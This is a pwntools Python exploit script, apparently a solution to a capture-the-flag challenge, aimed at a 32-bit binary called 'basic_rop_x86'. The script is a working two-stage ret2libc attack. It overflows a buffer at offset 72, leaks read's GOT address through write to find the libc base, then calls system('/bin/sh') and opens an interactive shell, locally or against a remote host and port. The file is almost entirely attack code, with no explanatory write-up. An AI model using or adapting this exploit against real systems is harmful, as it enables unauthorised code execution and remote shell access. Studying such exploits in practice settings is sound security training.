#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('basic_rop_x86')
libc = ELF("./libc.so.6")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+73
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():
    
    offset = 72

    payload = flat({
        offset: [
            exe.plt['write'],
            exe.sym['main'],
            0x1,
            exe.got['read'],
            0x8
        ]
    })

    io.sendline(payload)
    io.recvuntil(b"paaa")
    leak = u32(io.recvn(4))
    libc.address = leak - libc.sym['read']
    info("libc base: %#x", libc.address)
    io.clean()

    sh = next(libc.search(b'/bin/sh\x00'))
    system = libc.sym['system']

    stage2 = flat({
        offset: [
            system,
            0x0,
            sh
        ]
    })

    io.sendline(stage2)

    io.interactive()


def main():
    
    init()
    solve()


if __name__ == '__main__':
    main()

